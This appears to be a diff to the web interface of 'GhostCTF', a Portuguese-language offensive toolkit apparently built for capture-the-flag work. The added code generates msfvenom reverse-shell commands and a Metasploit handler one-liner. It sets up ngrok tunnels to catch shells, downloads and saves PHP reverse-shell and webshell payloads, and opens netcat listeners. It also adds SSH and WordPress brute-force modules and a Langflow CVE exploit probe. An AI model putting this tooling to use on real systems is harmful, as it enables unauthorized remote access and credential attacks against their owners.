+        No alvo, usa o <strong>teu IP</strong> alcançável (VPN, tun0, eth0, IP público se aplicável) e a porta, por exemplo:
+        <code>wget http://TEU_IP:8000/ficheiro</code> ou <code>curl -O http://TEU_IP:8000/ficheiro</code>.
+        Garante que firewall no teu host permite entrada nessa porta.
+      </p>
+      <p>
+        Isto é só uma <strong>referência rápida</strong> na UI — o servidor GhostCTF não inicia o <code>http.server</code> por ti.
+      </p>
+    </div>
   </div>
 </div>
 
@@ -1684,6 +2467,261 @@ function copyPythonHttpServer() {
   const raw = document.getElementById('httpServePort')?.value?.trim() || '8000';
   const port = /^\d{1,5}$/.test(raw) ? raw : '8000';
   copyText(`python3 -m http.server ${port}`);
+}
+
+/** LHOST/LPORT do bloco Msfvenom (manual) — msfManual* */
+function getMsfManualLhostLport() {
+  const lhost = document.getElementById('msfManualLhost')?.value?.trim() || 'TUN0_IP';
+  const rawP = document.getElementById('msfManualLport')?.value?.trim() || '4444';
+  const lport = /^\d{1,5}$/.test(rawP) ? rawP : '4444';
+  return { lhost, lport };
+}
+
+/** Porta onde o nc deve escutar no bloco Wandenreich (ngrok encaminha para aqui). */
+function getMsfLocalListenPort() {
+  const raw = document.getElementById('msfLocalPort')?.value?.trim();
+  if (raw && /^\d{1,5}$/.test(raw)) {
+    const n = parseInt(raw, 10);
+    if (n >= 1 && n <= 65535) return n;
+  }
+  const fb = document.getElementById('msfLport')?.value?.trim() || '4444';
+  const n2 = parseInt(fb, 10);
+  return n2 >= 1 && n2 <= 65535 ? n2 : 4444;
+}
+
+/** Porta local para ngrok no bloco Msfvenom (manual). */
+function getMsfManualLocalListenPort() {
+  const raw = document.getElementById('msfManualLocalPort')?.value?.trim();
+  if (raw && /^\d{1,5}$/.test(raw)) {
+    const n = parseInt(raw, 10);
+    if (n >= 1 && n <= 65535) return n;
+  }
+  return 4444;
+}
+
+/**
+ * Lê a API web do ngrok (4040) ou arranca `ngrok tcp` e preenche LHOST/LPORT.
+ * @param {boolean} startProcess
+ * @param {'manual'|'wandenreich'} [target] — campos a preencher (manual = msfManual*; wandenreich = msfLhost/msfLport)
+ */
+async function ghostctfNgrokFill(startProcess, target = 'wandenreich') {
+  const isManual = target === 'manual';
+  const localPort = isManual ? getMsfManualLocalListenPort() : getMsfLocalListenPort();
+  const path = startProcess ? '/api/ghostctf/ngrok-tcp-start' : '/api/ghostctf/ngrok-resolve';
+  const url = apiUrl(path);
+  const label = isManual ? 'Msfvenom (manual)' : 'Wandenreich';
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ localPort }),
+    });
+    const text = await res.text();
+    let j;
+    try {
+      j = text ? JSON.parse(text) : {};
+    } catch {
+      j = null;
+    }
+    if (!j || typeof j !== 'object' || typeof j.ok !== 'boolean') {
+      addLog(
+        `[ngrok] Resposta inválida (HTTP ${res.status}) em ${url}. Reinicia o servidor na pasta GHOSTCTF (\`npm start\`, porta 3847) e abre a UI pelo mesmo host. Prévia: ${String(text).slice(0, 120)}`,
+        'warn',
+      );
+      return;
+    }
+    if (!j.ok) {
+      addLog(`[ngrok] ${j.error || 'Falha sem mensagem.'}`, 'warn');
+      return;
+    }
+    if (isManual) {
+      const h = document.getElementById('msfManualLhost');
+      const p = document.getElementById('msfManualLport');
+      if (h) h.value = j.ngrokHost;
+      if (p) p.value = String(j.ngrokPort);
+    } else {
+      const h = document.getElementById('msfLhost');
+      const p = document.getElementById('msfLport');
+      if (h) h.value = j.ngrokHost;
+      if (p) p.value = String(j.ngrokPort);
+    }
+    const extra = j.started ? ' (processo ngrok iniciado)' : '';
+    addLog(
+      `[ngrok] ${label}: ${j.publicUrl} — nc em 127.0.0.1:${localPort} (porta local).${extra}`,
+      'success',
+    );
+  } catch (e) {
+    addLog(`[ngrok] ${e?.message || String(e)}`, 'error');
+  }
+}
+
+function copyMsfvenomPhpRaw() {
+  const { lhost, lport } = getMsfManualLhostLport();
+  copyText(`msfvenom -p php/reverse_php LHOST=${lhost} LPORT=${lport} -f raw -o shell.php`);
+}
+
+function copyMsfvenomLinux64() {
+  const { lhost, lport } = getMsfManualLhostLport();
+  copyText(`msfvenom -p linux/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o rev.elf`);
+}
+
+function copyMsfHandlerPhp() {
+  const { lhost, lport } = getMsfManualLhostLport();
+  copyText(
+    `msfconsole -q -x "use exploit/multi/handler; set payload php/reverse_php; set LHOST ${lhost}; set LPORT ${lport}; exploit -j"`,
+  );
+}
+
+async function downloadGhostctfPayload(kind) {
+  const api = apiUrl('/api/ghostctf/payload-file');
+  const lhost = document.getElementById('msfManualLhost')?.value?.trim() || '';
+  const rawP = document.getElementById('msfManualLport')?.value?.trim() || '4444';
+  const lport = parseInt(rawP, 10) || 4444;
+  const payload =
+    kind === 'php_webshell_min'
+      ? { kind }
+      : { kind: 'php_reverse_bash', lhost, lport };
+  if (kind !== 'php_webshell_min' && !lhost) {
+    addLog('Preenche LHOST antes de descarregar o .php reverse.', 'warn');
+    return;
+  }
+  try {
+    const res = await fetch(api, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+    if (!res.ok) {
+      const j = await res.json().catch(() => ({}));
+      addLog(j.error || `payload-file HTTP ${res.status}`, 'error');
+      return;
+    }
+    const blob = await res.blob();
+    const cd = res.headers.get('Content-Disposition') || '';
+    let filename = 'payload.php';
+    const m = /filename="([^"]+)"/i.exec(cd) || /filename=([^;\s]+)/i.exec(cd);
+    if (m) filename = m[1].replace(/["']/g, '').trim();
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = filename;
+    a.click();
+    URL.revokeObjectURL(a.href);
+    addLog(`Descarregado: ${filename}`, 'success');
+  } catch (e) {
+    addLog(`payload-file: ${e?.message || String(e)}`, 'error');
+  }
+}
+
+function ghostctfWandenreichKindNeedsLhost(kind) {
+  return String(kind || '').trim() !== 'php_webshell_min';
+}
+
+function ghostctfSyncWandenreichKindUi() {
+  const sel = document.getElementById('wandenreichPayloadKind');
+  const hint = document.getElementById('wandenreichKindHint');
+  const row = document.getElementById('wandenreichLhostRow');
+  const kind = sel?.value || 'php_reverse_bash';
+  const needs = ghostctfWandenreichKindNeedsLhost(kind);
+  if (row) row.style.opacity = needs ? '1' : '0.5';
+  if (hint) {
+    hint.textContent = needs
+      ? ''
+      : 'Webshell: não usa LHOST/LPORT neste ficheiro. O botão «mini-nc» não abre listener para este tipo.';
+  }
+  const ncChk = document.getElementById('payloadOpenNcChk');
+  const ncLabel = ncChk?.closest('label');
+  if (ncLabel) ncLabel.style.opacity = needs ? '1' : '0.55';
+  if (ncChk) ncChk.disabled = !needs;
+}
+
+function initWandenreichPayloadKindUi() {
+  const sel = document.getElementById('wandenreichPayloadKind');
+  if (!sel) return;
+  try {
+    const saved = localStorage.getItem('ghostctf_wandenreich_kind');
+    if (saved && [...sel.options].some((o) => o.value === saved)) sel.value = saved;
+  } catch {
+    /* */
+  }
+  sel.addEventListener('change', () => {
+    try {
+      localStorage.setItem('ghostctf_wandenreich_kind', sel.value);
+    } catch {
+      /* */
+    }
+    ghostctfSyncWandenreichKindUi();
+  });
+  ghostctfSyncWandenreichKindUi();
+}
+
+/**
+ * Grava payload em <raiz projeto>/payloads/ via API (tipo = select Wandenreich).
+ * @param {{ openNcAfter?: boolean, kind?: string }} [opts]
+ */
+async function ghostctfSavePayloadToDisk(opts) {
+  const openNcAfter = Boolean(opts?.openNcAfter);
+  const kind =
+    (opts?.kind && String(opts.kind).trim()) ||
+    document.getElementById('wandenreichPayloadKind')?.value?.trim() ||
+    'php_reverse_bash';
+  const needsLhost = ghostctfWandenreichKindNeedsLhost(kind);
+  const lhost = document.getElementById('msfLhost')?.value?.trim() || '';
+  const rawP = document.getElementById('msfLport')?.value?.trim() || '4444';
+  const lport = parseInt(rawP, 10) || 4444;
+  const body = needsLhost ? { kind, lhost, lport } : { kind };
+  if (needsLhost && !lhost) {
+    addLog('[payload] Preenche LHOST antes de gravar este tipo.', 'warn');
+    return;
+  }
+  try {
+    const res = await fetch(apiUrl('/api/ghostctf/payload-save'), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+    const j = await res.json().catch(() => ({}));
+    if (!res.ok || !j.ok) {
+      addLog(j.error || `[payload] payload-save HTTP ${res.status}`, 'error');
+      return;
+    }
+    addLog(
+      `[payload] Gravado ${j.relativePath} — upload manual no alvo; em reverses, o alvo deve alcançar LHOST:LPORT.`,
+      'success',
+    );
+    if (openNcAfter && needsLhost && document.getElementById('payloadOpenNcChk')?.checked) {
+      ghostctfOpenMiniNcAfterPayload(getMsfLocalListenPort(), j.relativePath);
+    } else if (openNcAfter && needsLhost) {
+      addLog(
+        `[payload] Mini-nc não iniciado (checkbox desligada). Porta local sugerida: ${getMsfLocalListenPort()}`,
+        'info',
+      );
+    } else if (openNcAfter && !needsLhost) {
+      addLog('[payload] Mini-nc não aplicável ao webshell (sem reverse TCP no ficheiro).', 'info');
+    }
+  } catch (e) {
+    addLog(`[payload] ${e?.message || String(e)}`, 'error');
+  }
+}
+
+function ghostctfOpenMiniNcAfterPayload(listenPort, relativePath) {
+  const panel = document.getElementById('shellMiniPanel');
+  const hidden =
+    !panel ||
+    panel.style.display === 'none' ||
+    window.getComputedStyle(panel).display === 'none';
+  if (hidden) shellToggleMini();
+  const bridgePort = document.getElementById('shellBridgePort');
+  if (bridgePort) bridgePort.value = String(listenPort);
+  const loc = document.getElementById('msfLocalPort');
+  if (loc) loc.value = String(listenPort);
+  addLog(
+    `[payload] Mini-terminal: nc -nlvp ${listenPort} — payload aponta para LHOST/LPORT dos campos; upload manual: ${relativePath}`,
+    'info',
+  );
+  shellBridgeHardStop();
+  setTimeout(() => {
+    shellBridgeStart();
+  }, 450);
 }
 
 function getShellWsUrl() {
@@ -2116,12 +3154,25 @@ async function startRecon() {
     v === 'exploitdb' ||
     v === 'lfiProbe' ||
     v === 'sqlmapProbe' ||
+    v === 'sqlmapWsProbe' ||
+    v === 'tinyFmProbe' ||
+    v === 'activeMqProbe' ||
     v === 'vhostSitemapProbe' ||
+    v === 'uploadSurfaceProbe' ||
     v === 'disclosureProbe' ||
     v === 'credReuseProbe' ||
     v === 'wpFocusProbe' ||
     v === 'wpScanProbe' ||
-    v === 'etcHostsProbe');
+    v === 'etcHostsProbe' ||
+    v === 'extendedServiceProbe' ||
+    v === 'secondaryMysqlProbe' ||
+    v === 'openapiProbe' ||
+    v === 'vhostPrefixFuzz' ||
+    v === 'sshBruteProbe' ||
+    v === 'sshBruteAutoHydra' ||
+    v === 'sshBruteSolydWordlists' ||
+    v === 'hydraWpBruteProbe' ||
+    v === 'langflowExploitProbe');
 
   addLog(`Iniciando GHOSTCTF para: ${targetDomain}`, 'section');
   addLog(`Módulos (GhostCTF): ${modulesGhost.join(', ') || '(nenhum)' }`, 'info');
@@ -2170,6 +3221,66 @@ async function startRecon() {
         hostsOnlyWeb: selectedMods.includes('etcHostsProbe') && Boolean(document.getElementById('hostsOnlyWebChk')?.checked),
         udpScan,
         tcpAllPorts,
+        secondaryMysqlHosts: selectedMods.includes('secondaryMysqlProbe')
+          ? String(document.getElementById('secondaryMysqlHostsInput')?.value || '')
+              .split(/[\n,]+/)
+              .map((s) => s.trim())
+              .filter(Boolean)
+          : [],
+        vhostBaseDomain: selectedMods.includes('vhostPrefixFuzz')
+          ? String(document.getElementById('vhostBaseDomainInput')?.value || '').trim()
+          : '',
+        vhostFuzzExtraPrefixes: selectedMods.includes('vhostPrefixFuzz')
+          ? String(document.getElementById('vhostFuzzExtraPrefixesInput')?.value || '').trim()
+          : '',
+        sshBruteUsers: selectedMods.includes('sshBruteProbe')
+          ? String(document.getElementById('sshBruteUsersInput')?.value || '').trim()
+          : '',
+        sshBruteWordlistPath: selectedMods.includes('sshBruteProbe')
+          ? String(document.getElementById('sshBruteWordlistPathInput')?.value || '').trim()
+          : '',
+        sshBruteMaxPasswords: selectedMods.includes('sshBruteProbe')
+          ? Number(document.getElementById('sshBruteMaxPwInput')?.value) || 150
+          : 150,
+        sshBruteAutoHydra:
+          selectedMods.includes('sshBruteProbe') && selectedMods.includes('sshBruteAutoHydra'),
+        sshBruteAutoTimeoutMs:
+          selectedMods.includes('sshBruteProbe') && selectedMods.includes('sshBruteAutoHydra')
+            ? Math.min(120, Math.max(5, Number(document.getElementById('sshBruteAutoTimeoutMinInput')?.value) || 30)) *
+              60_000
+            : 1_800_000,
+        sshBruteSolydWordlists:
+          selectedMods.includes('sshBruteProbe') && selectedMods.includes('sshBruteSolydWordlists'),
+        hydraWpBruteUsers: selectedMods.includes('hydraWpBruteProbe')
+          ? String(document.getElementById('hydraWpBruteUsersInput')?.value || '').trim()
+          : '',
+        hydraWpBruteWordlistPath: selectedMods.includes('hydraWpBruteProbe')
+          ? String(document.getElementById('hydraWpBruteWordlistPathInput')?.value || '').trim()
+          : '',
+        hydraWpBruteMaxPasswords: selectedMods.includes('hydraWpBruteProbe')
+          ? Number(document.getElementById('hydraWpBruteMaxPwInput')?.value) || 150
+          : 150,
+        langflowHostHeader: selectedMods.includes('langflowExploitProbe')
+          ? String(document.getElementById('langflowHostHeaderInput')?.value || '').trim()
+          : '',
+        langflowTryAllOrigins: selectedMods.includes('langflowExploitProbe')
+          ? Boolean(document.getElementById('langflowTryAllOriginsChk')?.checked)
+          : false,
+        langflowAlsoTryFlagPath: selectedMods.includes('langflowExploitProbe')
+          ? Boolean(document.getElementById('langflowAlsoFlagChk')?.checked)
+          : false,
+        langflowVerticesShell: selectedMods.includes('langflowExploitProbe')
+          ? Boolean(document.getElementById('langflowVerticesShellChk')?.checked)
+          : false,
+        langflowNgrokHost: selectedMods.includes('langflowExploitProbe')
+          ? String(document.getElementById('langflowNgrokHostInput')?.value || '').trim()
+          : '',
+        langflowNgrokPort: selectedMods.includes('langflowExploitProbe')
+          ? Number(document.getElementById('langflowNgrokPortInput')?.value) || 0
+          : 0,
+        langflowBuildFlowId: selectedMods.includes('langflowExploitProbe')
+          ? String(document.getElementById('langflowBuildFlowIdInput')?.value || '').trim()
+          : '',
       }),
     });
 
@@ -2469,6 +3580,60 @@ document.getElementById('domainInput').addEventListener('keydown', e => {
   if (e.key === 'Enter') startRecon();
 });
 
+const SIDEBAR_PAYLOAD_MODULE_KEYS = ['decodeQuick', 'pty', 'httpServe', 'msfvenom', 'wandenreich', 'sshBrute', 'wpBruteHydra', 'langflowCve', 'crackMode'];
+
+function toggleSidebarPayloadModule(moduleId) {
+  const card = document.getElementById(`${moduleId}ModuleCard`);
+  const btn = document.getElementById(`${moduleId}ModuleToggle`);
+  if (!card || !btn) return;
+  const nowOff = !card.classList.contains('sidebar-module-off');
+  if (nowOff) {
+    card.classList.add('sidebar-module-off');
+    btn.textContent = 'OFF';
+    btn.setAttribute('aria-expanded', 'false');
+  } else {
+    card.classList.remove('sidebar-module-off');
+    btn.textContent = 'ON';
+    btn.setAttribute('aria-expanded', 'true');
+  }
+  try {
+    localStorage.setItem(`ghostctf_sidebar_${moduleId}_off`, nowOff ? '1' : '0');
+  } catch {
+    /* */
+  }
+}
+
+function initSidebarPayloadModules() {
+  try {
+    const leg = localStorage.getItem('ghostctf_sidebar_wandereich_off');
+    if (leg !== null && localStorage.getItem('ghostctf_sidebar_wandenreich_off') === null) {
+      localStorage.setItem('ghostctf_sidebar_wandenreich_off', leg);
+    }
+  } catch {
+    /* */
+  }
+  for (const moduleId of SIDEBAR_PAYLOAD_MODULE_KEYS) {
+    const card = document.getElementById(`${moduleId}ModuleCard`);
+    const btn = document.getElementById(`${moduleId}ModuleToggle`);
+    if (!card || !btn) continue;
+    let off = false;
+    try {
+      off = localStorage.getItem(`ghostctf_sidebar_${moduleId}_off`) === '1';
+    } catch {
+      /* */
+    }
+    if (off) {
+      card.classList.add('sidebar-module-off');
+      btn.textContent = 'OFF';
+      btn.setAttribute('aria-expanded', 'false');
+    } else {
+      card.classList.remove('sidebar-module-off');
+      btn.textContent = 'ON';
+      btn.setAttribute('aria-expanded', 'true');
+    }
+  }
+}
+
 async function fetchKaliCapabilities() {
   const line = document.getElementById('kaliCapLine');
   const crackLine = document.getElementById('crackCapLine');
@@ -2566,6 +3731,16 @@ document.querySelectorAll('input.mod').forEach((cb) => {
   });
 });
 
+document.getElementById('modSshBrute')?.addEventListener('change', (e) => {
+  const auto = document.getElementById('modSshBruteAuto');
+  const solyd = document.getElementById('modSshBruteSolyd');
+  if (!e.target.checked) {
+    if (auto) auto.checked = false;
+    if (solyd) solyd.checked = false;
+    updateModuleTags();
+  }
+});
+
 document.getElementById('modEtcHostsProbe')?.addEventListener('change', (e) => {
   const w = document.getElementById('extraHostsWrap');
   if (w) w.style.display = e.target.checked ? 'block' : 'none';
@@ -2578,7 +3753,132 @@ document.getElementById('modEtcHostsProbe')?.addEventListener('change', (e) => {
 updatePlatformTags();
 updateModuleTags();
 
+(function initFindingsHelpModal() {
+  const overlay = document.getElementById('findingsHelpOverlay');
+  const btn = document.getElementById('findingsHelpBtn');
+  const closeBtn = document.getElementById('findingsHelpClose');
+  const modal = overlay?.querySelector('.help-modal');
+  if (!overlay || !btn) return;
+
+  function openFindingsHelp() {
+    overlay.classList.add('is-open');
+    overlay.setAttribute('aria-hidden', 'false');
+    document.body.style.overflow = 'hidden';
+    setTimeout(() => modal?.focus(), 10);
+  }
+
+  function closeFindingsHelp() {
+    overlay.classList.remove('is-open');
+    overlay.setAttribute('aria-hidden', 'true');
+    document.body.style.overflow = '';
+    btn.focus();
+  }
+
+  btn.addEventListener('click', (e) => {
+    e.preventDefault();
+    e.stopPropagation();
+    openFindingsHelp();
+  });
+  closeBtn?.addEventListener('click', (e) => {
+    e.preventDefault();
+    closeFindingsHelp();
+  });
+  overlay.addEventListener('click', (e) => {
+    if (e.target === overlay) closeFindingsHelp();
+  });
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && overlay.classList.contains('is-open')) closeFindingsHelp();
+  });
+})();
+
+(function initModulesHelpModal() {
+  const overlay = document.getElementById('modulesHelpOverlay');
+  const btn = document.getElementById('modulesHelpBtn');
+  const closeBtn = document.getElementById('modulesHelpClose');
+  const modal = overlay?.querySelector('.help-modal');
+  if (!overlay || !btn) return;
+
+  function openModulesHelp() {
+    overlay.classList.add('is-open');
+    overlay.setAttribute('aria-hidden', 'false');
+    document.body.style.overflow = 'hidden';
+    setTimeout(() => modal?.focus(), 10);
+  }
+
+  function closeModulesHelp() {
+    overlay.classList.remove('is-open');
+    overlay.setAttribute('aria-hidden', 'true');
+    document.body.style.overflow = '';
+    btn.focus();
+  }
+
+  btn.addEventListener('click', (e) => {
+    e.preventDefault();
+    e.stopPropagation();
+    openModulesHelp();
+  });
+  closeBtn?.addEventListener('click', (e) => {
+    e.preventDefault();
+    closeModulesHelp();
+  });
+  overlay.addEventListener('click', (e) => {
+    if (e.target === overlay) closeModulesHelp();
+  });
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && overlay.classList.contains('is-open')) closeModulesHelp();
+  });
+})();
+
+(function initSidebarToolHelpModals() {
+  function bindHelp(overlayId, btnId, closeId) {
+    const overlay = document.getElementById(overlayId);
+    const btn = document.getElementById(btnId);
+    const closeBtn = document.getElementById(closeId);
+    const modal = overlay?.querySelector('.help-modal');
+    if (!overlay || !btn) return;
+    function open() {
+      overlay.classList.add('is-open');
+      overlay.setAttribute('aria-hidden', 'false');
+      document.body.style.overflow = 'hidden';
+      setTimeout(() => modal?.focus(), 10);
+    }
+    function close() {
+      overlay.classList.remove('is-open');
+      overlay.setAttribute('aria-hidden', 'true');
+      document.body.style.overflow = '';
+      btn.focus();
+    }
+    btn.addEventListener('click', (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      open();
+    });
+    closeBtn?.addEventListener('click', (e) => {
+      e.preventDefault();
+      close();
+    });
+    overlay.addEventListener('click', (e) => {
+      if (e.target === overlay) close();
+    });
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && overlay.classList.contains('is-open')) close();
+    });
+  }
+  bindHelp('decodeHelpOverlay', 'decodeHelpBtn', 'decodeHelpClose');
+  bindHelp('ptyHelpOverlay', 'ptyHelpBtn', 'ptyHelpClose');
+  bindHelp('httpServeHelpOverlay', 'httpServeHelpBtn', 'httpServeHelpClose');
+  bindHelp('msfvenomManualHelpOverlay', 'msfvenomManualHelpBtn', 'msfvenomManualHelpClose');
+  bindHelp('wandenreichHelpOverlay', 'wandenreichHelpBtn', 'wandenreichHelpClose');
+  bindHelp(
+    'wandenreichPostShellManualOverlay',
+    'wandenreichPostShellManualBtn',
+    'wandenreichPostShellManualClose',
+  );
+})();
+
 fetchKaliCapabilities();
+initSidebarPayloadModules();
+initWandenreichPayloadKindUi();
 loadRunsHistory();
 </script>
 </body>
